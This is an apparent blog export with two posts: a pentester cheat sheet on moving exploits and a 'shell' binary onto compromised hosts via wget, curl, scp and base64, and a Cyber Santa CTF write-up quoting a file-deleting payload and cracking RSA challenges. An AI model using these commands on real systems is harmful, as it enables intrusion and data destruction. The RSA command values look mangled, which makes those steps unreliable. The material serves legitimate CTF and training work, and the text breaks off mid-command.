ways..","published":true,"datePublished":1641383870315,"tags":["ctf","filesharing","linux","wget","cheatsheet","hacking"],"description":"Quick filesharing techniques for Pentesters","canonicalUrl":"https://dev.lwlx.xyz/blog/filesharing-for-pentesters","author":"lwlx","authorPhoto":"/profile","authorTwitter":"0x0000005","bannerPhoto":"/default","thumbnailPhoto":"/default.jpg","content":"\n# **Transferring Files**\n\n---\n\nDuring any penetration testing exercise, it is likely that we will need to transfer files to the remote server, such as enumeration scripts or exploits, or transfer data back to our attack host. While tools like Metasploit with a Meterpreter shell allow us to use the `Upload` command to upload a file, we need to learn methods to transfer files with a standard reverse shell.\n\n---\n\n# **Using wget**\n\nThere are many methods to accomplish this. One method is running a [Python HTTP server](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/set_up_a_local_testing_server) on our machine and then using `wget` or `cURL` to download the file on the remote host. First, we go into the directory that contains the file we need to transfer and run a Python HTTP server in it:\n\n```\nlwlx@cybertap[/cybertap]$ cd /tmp\nlwlx@cybertap[/cybertap]$ python3 -m http.server 8000Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n\n```\n\nNow that we have set up a listening server on our machine, we can download the file on the remote host that we have code execution on:\n\n```\nuser@remotehost$ wget http://10.10.14.1:8000/exploit.sh......\nSaving to: 'exploit.sh'\n\nexploit.sh 100%[==============================================\u003e] 144.86K  --.-KB/s    in 0.02s\n\n2021-02-08 18:09:19 (8.16 MB/s) - 'exploit.sh' saved [14337/14337]\n\n```\n\nNote that we used our IP `10.10.14.1` and the port our Python server runs on `8000`. If the remote server does not have `wget`, we can use `cURL` to download the file:\n\n```\nuser@remotehost$ curl http://10.10.14.1:8000/exploit.sh -o exploit.sh\n100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k\n\n```\n\nNote that we used the `-o` flag to specify the output file name.\n\n---\n\n# **Using SCP**\n\nAnother method to transfer files would be using `scp`, granted we have obtained ssh user credentials on the remote host. We can do so as follows:\n\n```\nlwlx@cybertap[/cybertap]$ scp exploit.sh user@remotehost:/tmp/exploit.shuser@remotehost's password: **********\nexploit.sh\n\n```\n\nNote that we specified the local file name after `scp`, and the remote directory will be saved to after the `:`.\n\n---\n\n# **Using Base64**\n\nIn some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to [base64](https://linux.die.net/man/1/base64) encode the file into `base64` format, and then we can paste the `base64` string on the remote server and decode it. For example, if we wanted to transfer a binary file called `shell`, we can `base64` encode it as follows:\n\n```\nlwlx@cybertap[/cybertap]$ base64 shell -w 0f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA.....lIuy9iaW4vc2gAU0iJ51JXSInmDwU\n\n```\n\nNow, we can copy this `base64` string, go to the remote host, and use `base64 -d` to decode it, and pipe the output into a file:\n\n```\nuser@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA.....lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d \u003e shell\n```\n\n---\n\n# **Validating File Transfers**\n\nTo validate the format of a file, we can run the [file](https://linux.die.net/man/1/file) command on it:\n\n```\nuser@remotehost$ file shell\nshell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header\n\n```\n\nAs we can see, when we run the `file` command on the `shell` file, it says that it is an ELF binary, meaning that we successfully transferred it. To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. On our machine, we can run `md5sum` on it:\n\n```\nlwlx@cybertap[/cybertap]$ md5sum shell\n321de1d7e7c3735838890a72c9ae7d1d shell\n\n```\n\nNow, we can go to the remote server and run the same command on the file we transferred:\n\n```\nuser@remotehost$ md5sum shell\n321de1d7e7c3735838890a72c9ae7d1d shell\n\n```\n\nAs we can see, both files have the same md5 hash, meaning the file was transferred correctly. There are various other methods for transferring files.\n\n\n\n# CheatSheet\n\n\u003ctable\u003e\n\u003cthead\u003e\n  \u003ctr\u003e\n    \u003cth colspan=\"2\"\u003eTransferring Files\u003c/th\u003e\n  \u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n  \u003ctr\u003e\n    \u003ctd\u003e\u003ccode\u003epython3 -m http.server 8000\u003ccode\u003e\u003c/td\u003e\n    \u003ctd\u003eStart a local webserver\u003c/td\u003e\n  \u003c/tr\u003e\n  \u003ctr\u003e\n    \u003ctd\u003e\u003ccode\u003ewget http://10.10.14.1:8000/exploit.sh\u003ccode\u003e\u003c/td\u003e\n    \u003ctd\u003eDownload a file on the remote server from our local machine\u003c/td\u003e\n  \u003c/tr\u003e\n  \u003ctr\u003e\n    \u003ctd\u003e\u003ccode\u003ecurl http://10.10.14.1:8000/exploit.sh -o exploit.sh\u003ccode\u003e\u003c/td\u003e\n    \u003ctd\u003eDownload a file on the remote server from our local machine\u003c/td\u003e\n  \u003c/tr\u003e\n  \u003ctr\u003e\n    \u003ctd\u003e\u003ccode\u003escp exploit.sh user@remotehost:/tmp/exploit.sh\u003ccode\u003e\u003c/td\u003e\n    \u003ctd\u003eTransfer a file to the remote server with scp (requires SSH access)\u003c/td\u003e\n  \u003c/tr\u003e\n  \u003ctr\u003e\n    \u003ctd\u003e\u003ccode\u003ebase64 shell -w 0\u003ccode\u003e\u003c/td\u003e\n    \u003ctd\u003eConvert a file to base64\u003c/td\u003e\n  \u003c/tr\u003e\n  \u003ctr\u003e\n    \u003ctd\u003e\u003ccode\u003eecho f0VMR...SNIO...InmDwU | base64 -d \u0026gt; shell\u003c/code\u003e\u003c/td\u003e\n    \u003ctd\u003eConvert a file from \u003ccode\u003ebase64\u003ccode\u003e back to its orig\u003c/td\u003e\n  \u003c/tr\u003e\n  \u003ctr\u003e\n    \u003ctd\u003e\u003ccode\u003emd5sum shell\u003ccode\u003e\u003c/td\u003e\n    \u003ctd\u003eCheck the file's \u003ccode\u003emd5sum\u003ccode\u003e to ensure it converted correctly\u003c/td\u003e\n  \u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e"},{"path":"blog/CyberSanta","title":"HTB write up for Cyber Santa[CTF] challenges","subtitle":null,"published":true,"datePublished":1638891629934,"tags":["cybersanta","htb","CTF","security","web","crypto"],"description":"Cyber Santa is Coming to Town!","canonicalUrl":"https://dev.lwlx.xyz/blog/CyberSanta","author":"lwlx","authorPhoto":"/profile","authorTwitter":"0x0000005","bannerPhoto":"/htb/cybersanta","thumbnailPhoto":"/htb/cybersanta.png","content":"\n# Cyber Santa Hack The Box 2021 _[EASY]_\n\n`rm  /var/www/html/sites/default/files/.ht.sqlite \u0026\u0026 echo SFRCezBrX24wd18zdjNyeTBuM19oNHNfdDBfZHIwcF8wZmZfdGgzaXJfbDN0dDNyc180dF90aDNfcDBzdF8wZmYxYzNfNGc0MW59 \u003e /dev/null 2\u003e\u00261 \u0026\u0026 ls -al  /var/www/html/sites/default/files`\n\n\n## lets start easy witht he first forensic challenge named baby apt\n![baby-apt](/htb/baby-apt.png \"ok\")\n\u003e This is the most wonderful time of the year, but not for Santa's incident response team. Since Santa went digital, everyone can write a letter to him using his brand new website. Apparently an APT group hacked their way in to Santa's server and destroyed his present list. Could you investigate what happened?\n\nwe get a .pcap file, lets analyze it with wireshark. we can quickly filter through this small capture and notice some interesting http traffic, taking a closer look we find a special payload. Lets try and make it readable.\n\nfind the solution below:\n\n\u003e \u003ca href=\"https://cyberchef.cybertap.ch/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)\u0026input=IFNGUkNlekJyWDI0d2QxOHpkak55ZVRCdU0xOW9OSE5mZERCZlpISXdjRjh3Wm1aZmRHZ3phWEpmYkROMGRETnljMTgwZEY5MGFETmZjREJ6ZEY4d1ptWXhZek5mTkdjME1XNTk\"\u003ehttps://cyberchef.cybertap.ch/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)\u0026input=IFNGUkNlekJyWDI0d2QxOHpkak55ZVRCdU0xOW9OSE5mZERCZlpISXdjRjh3Wm1aZmRHZ3phWEpmYkROMGRETnljMTgwZEY5MGFETmZjREJ6ZEY4d1ptWXhZek5mTkdjME1XNTk\u003c/a\u003e\n yay!\n\n\nokay now lets do some cryptography, the `common mistake` challenge looks interesting. \n![common-mistake](/htb/commonMistake.png \"ok\")\n\u003e Elves are trying very hard to communicate in perfect secrecy in order to keep Santa's warehouse. Unfortunately, their lack of knowledge about cryptography leads them to common mistakes.\n\n\n{'n': '0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef', \n\n'e': '0x10001', == `65537 `\n\n 'ct': '0x55cfe232610aa54dffcfb346117f0a38c77a33a2c67addf7a0368c93ec5c3e1baec9d3fe35a123960edc2cbdc238f332507b044d5dee1110f49311efc55a2efd3cf041bfb27130c2266e8dc61e5b99f275665823f584bc6139be4c153cdcf153bf4247fb3f57283a53e8733f982d790a74e99a5b10429012bc865296f0d4f408f65ee02cf41879543460ffc79e84615cc2515ce9ba20fe5992b427e0bbec6681911a9e6c6bbc3ca36c9eb8923ef333fb7e02e82c7bfb65b80710d78372a55432a1442d75cad5b562209bed4f85245f0157a09ce10718bbcef2b294dffb3f00a5a804ed7ba4fb680eea86e366e4f0b0a6d804e61a3b9d57afb92ecb147a769874'}\n\n{'n': '0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef', 'e': '0x23', 'ct': '0x79834ce329453d3c4af06789e9dd654e43c16a85d8ba0dfa443aefe1ab4912a12a43b44f58f0b617662a459915e0c92a2429868a6b1d7aaaba500254c7eceba0a2df7144863f1889fab44122c9f355b74e3f357d17f0e693f261c0b9cefd07ca3d1b36563a8a8c985e211f9954ce07d4f75db40ce96feb6c91211a9ff9c0a21cad6c5090acf48bfd88042ad3c243850ad3afd6c33dd343c793c0fa2f98b4eabea399409c1966013a884368fc92310ebcb3be81d3702b936e7e883eeb94c2ebb0f9e5e6d3978c1f1f9c5a10e23a9d3252daac87f9bb748c961d3d361cc7dacb9da38ab8f2a1595d7a2eba5dce5abee659ad91a15b553d6e32d8118d1123859208'}\n\n```bash\npython3 RsaCtfTool.py --createpub -n 169110111150246174221951591062214641241271111718815524654288210424833123127173150112140251238120878758198621586155681764225225225321760331311382495154109226429722162163222225192184871961478914521711220128776162134322458212471039532244301621751871121922261671557312014549194242143232337569621953581541281472201191212361321244323410514101615614247175244892267156205548921723723114922420924813031213180146362037117410224917460882501022199416924761123116255741383646145347915221824010030138143241155882511407317716517117689244667322321417818121161682041244416214787175701692202401741474811914324118316822883332011683207232395833171735119123516218242412716616717514239 -e `65537`\n```\n\nuse RsaCtfTool for this\n\n-----BEGIN PUBLIC KEY-----  \nMIIBNTANBgkqhkiG9w0BAQEFAAOCASIAMIIBHQKCARQA6qYyB5IDi3DjVvi7kCB+  \neHhYPqF1LFwRwcVCs1PH4edCy30ocO67QLVRC7CbiGhijMCR/aXRODY3srLU7VwF  \n7JHZd5lC/6QHSh80PgFdz1KxqXeuo0zzI8HuqhgiI/cZvvmBuiOiJsq+dQFxIsJy  \neQceaiucmtewc8v50kN2n3KbPjeXAv79JF2BVAEdnsbzEdl8rZYx6KYjsFuYv032  \nZNdKgxyzoQZhzJme5mmXpGa2sVDUNYBEfeUVcfQRt+QjvSzjpT6xXYkogBaRe5Jg  \n/6R8Gdujc2M3yuvQDxqngQ3Oiz4wxsN9GuXVwadYVZ0ne2CUAQcDeHnUVqKW7HLl  \nOhu9MDTY9+OTEuAoWIMb7REhNf8CAwEAAQ==  \n-----END PUBLIC KEY-----\n```bash\n    python3 RsaCtfTool.py -n 169110111150246174221951591062214641241271111718815524654288210424833123127173150112140251238120878758198621586155681764225225225321760331311382495154109226429722162163222225192184871961478914521711220128776162134322458212471039532244301621751871121922261671557312014549194242143232337569621953581541281472201191212361321244323410514101615614247175244892267156205548921723723114922420924813031213180146362037117410224917460882501022199416924761123116255741383646145347915221824010030138143241155882511407317716517117689244667322321417818121161682041244416214787175701692202401741474811914324118316822883332011683207232395833171735119123516218242412716616717514239 -e 65537 --uncipher 85207226509710165772552071797017127105619912251162198122221247160541401472369262271742012112545316135150142204418919456243508012347793238171624414717239197904625360240651911781134819438110141198309115324211710288352451321889757190762160220241831916671251638740588323211563152451211011623315491166614418188134821502402122448246942244424424121845296255199158132979219481922331863225489146180392241872361021291452615810810718860163108158184146622435125112622324412325110118471621513111416584501616845117202213181983215523779133369518716015622572418720624217814822325163016516842371231642511041423413422710222824017616621642302659157871751854620320122118152116 --private\n````\n\nnice we got a private key\n\n    -----BEGIN RSA PRIVATE KEY-----\n    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\n    cUKmPPb91jz2ahTlBZ2IMnHT4nEz\n    -----END RSA PRIVATE KEY-----\n\nand deciphered text:\n\n    Unciphered data :\n    HEX : 0x93ce7f9abec56ab02c7b6f2442eb54ea85c25452c6649791198f921b8895b37c2e91e3c215f8a18f222933334d4228f1f35679a83a3aaa27c6f717ecb5a0989e81bf10ed89e8997289baad9498be74229161fe3d6b9f20af2923751b9edd92dd99e270c14f9ab6aa47c70e67594d9de12b2f4a5cb6c14961aed6b6c95537fec58f78e656cdc5a6e3a8df63a1a1abacea2ea9e42ea3916f6d54e4ab6638d004305b208697bdfc9ead998a356b53b26d2a5543241ab94dd7e3875a599319fbd49d2a2f3af0a163e79ddea69b832eadff4a443bc5d1aa448021b4601eedbb67fa39838a91f8071c6c1864aac3efc7eaf0ba872ee1f9d0c24bbb8179cc2fcea345a2896d3cb5532fa2c03be84465f1e3aaffaaae0e\n    INT (big endian) : 106523253901300334604683207833379234922023036276037014961974913713745025012872031053388146786272447030652944950843391449373541880474936028335701738255122664883682995745267770467681591960324156535024693894389120282282113351291033391141230044475747692019455788082806824699685172718995193358681983722833424620108342223698953641772575884832595512290859496693137456587970330022789088463481451423248003110893524195235929033825563416068579453588708071918671865447288455011963418404923938575049626081964274020342119025903786836276109132375192598117351059800672120889746578293877266424496358847494653436053080172097177436703486733259158493837620393486013927765796562054670\n    INT (little endian) : 10581433148091013279960381394938329144519670438976771265601529239725737680102410485583778694667876301614088688991055195434262010454916755671757088905403912897346553714085759869640657492073275582479180603159364159240301280082198266519595822746590071128056609154184027928287671847272319284001366503724334119380196691311108459277979297346923030882970983616921068437680765237482794875612016523395502485364745322268883603551572582102105572408952268648036113411991627619429396018951874769852958821593993826876857661031011443315743893359693637845937022684255566894404363285097252860791136497697873836891090918708466825942837949053991800663688177870287844261703333170835\n    STR : b'\\x93\\xce\\x7f\\x9a\\xbe\\xc5j\\xb0,{o$B\\xebT\\xea\\x85\\xc2TR\\xc6d\\x97\\x91\\x19\\x8f\\x92\\x1b\\x88\\x95\\xb3|.\\x91\\xe3\\xc2\\x15\\xf8\\xa1\\x8f\")33MB(\\xf1\\xf3Vy\\xa8::\\xaa\\'\\xc6\\xf7\\x17\\xec\\xb5\\xa0\\x98\\x9e\\x81\\xbf\\x10\\xed\\x89\\xe8\\x99r\\x89\\xba\\xad\\x94\\x98\\xbet\"\\x91a\\xfe=k\\x9f \\xaf)#u\\x1b\\x9e\\xdd\\x92\\xdd\\x99\\xe2p\\xc1O\\x9a\\xb6\\xaaG\\xc7\\x0egYM\\x9d\\xe1+/J\\\\\\xb6\\xc1Ia\\xae\\xd6\\xb6\\xc9U7\\xfe\\xc5\\x8fx\\xe6V\\xcd\\xc5\\xa6\\xe3\\xa8\\xdfc\\xa1\\xa1\\xab\\xac\\xea.\\xa9\\xe4.\\xa3\\x91omT\\xe4\\xabf8\\xd0\\x040[ \\x86\\x97\\xbd\\xfc\\x9e\\xad\\x99\\x8a5kS\\xb2m*UC$\\x1a\\xb9M\\xd7\\xe3\\x87ZY\\x93\\x19\\xfb\\xd4\\x9d*/:\\xf0\\xa1c\\xe7\\x9d\\xde\\xa6\\x9b\\x83.\\xad\\xffJD;\\xc5\\xd1\\xaaD\\x80!\\xb4`\\x1e\\xed\\xbbg\\xfa9\\x83\\x8a\\x91\\xf8\\x07\\x1cl\\x18d\\xaa\\xc3\\xef\\xc7\\xea\\xf0\\xba\\x87.\\xe1\\xf9\\xd0\\xc2K\\xbb\\x81y\\xcc/\\xce\\xa3E\\xa2\\x89m\u003c\\xb5S/\\xa2\\xc0;\\xe8De\\xf1\\xe3\\xaa\\xff\\xaa\\xae\\x0e'\n\nlets see the other one\n```bash\n    python3 ./RsaCtfTool/RsaCtfTool.py -n 4812097575410154102575410254971011001005310257102549749545750505710249499854102979853565798102545154499953505456102565049559855102971005754554856991029810110155565355535551979954485410055535457985252984850971029910299102100100575199504956515697102575151515454100101505097544949549750975110010110149994848495352535599525751535757491005755484952564852100511005110148100509810148519710052501025455531025048102524910197509710298985548994810150975557985257555657495149995010250561021015650495298525348541009851535197579756485751100995555555710199565255995098101975457481015453511005156561015010297102102525357101505255515699100515453571005710110010155575310148100491025656504910210053985257505052999852559710154541025797101519953561029754541009853101975710255511005598555249575157485256975052501015749505052102575610097102485452491015697561021024957985356102985699525798499753979898485357102525250525710010210054494953495349495397495252999955995099975057515355971025254975710099495648489710157515148555556102102499855975610152535150494952555253519910249551011025197504949499710051519810210198975098545097485255102975497559710248101101102 -e 481205051 --uncipher 4812055575651529910151505752535110051995297102485455565710157100100545352101525199495497565310056989748100102975252519710110210149979852574950974950975251985252102535610248985449555454509752535757495310148995750975052505756545697549849100559797979897534848505352995510199101989748975010010255495252565451102495656571029798525249505099571025153539855521015110251535510049551024810154575110250544999489857991011021004855999751100499851545354519756975699575653101504949102575753529910148551005210255531009852489910157541021019854995749504949975710210257994897504999971005499534857489799102525698102100565648525097100519950525156534897100519710210054995151100100515251995557519948102975010257569852101979810197515757524857994957545448495197565652515456102995750514948101989998519810156491005155485098575154101551015656511011019857529950101989848102571015310154100515755569949102491025799539749481015051975710051505350100979799565510257989855525699575449100511005154499999551009799985710097515697985610250974953575310055975010198975310099101539798101101545357971005749974953985353511005410151501005649495610049495051565357504856 --private\n````\n\nour other key:\n```\n    -----BEGIN RSA PRIVATE KEY-----\n    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\n    -----END RSA PRIVATE KEY-----\n```\n\n```bash\necho 0x55cfe232610aa54dffcfb346117f0a38c77a33a2c67addf7a0368c93ec5c3e1baec9d3fe35a123960edc2cbdc238f332507b044d5dee1110f49311efc55a2efd3cf041bfb27130c2266e8dc61e5b99f275665823f584bc6139be4c153cdcf153bf4247fb3f57283a53e8733f982d790a74e99a5b10429012bc865296f0d4f408f65ee02cf41879543460ffc79e84615cc2515ce9ba20fe5992b427e0bbec6681911a9e6c6bbc3ca36c9eb8923ef333fb7e02e82c7bfb65b80710d78372a55432a1442d75cad5b562209bed4f85245f0157a09ce10718bbcef2b294dffb3f00a5a804ed7ba4fb680eea86e366e4f0b0a6d804e61a3b9d57afb92ecb147a769874 \u003e 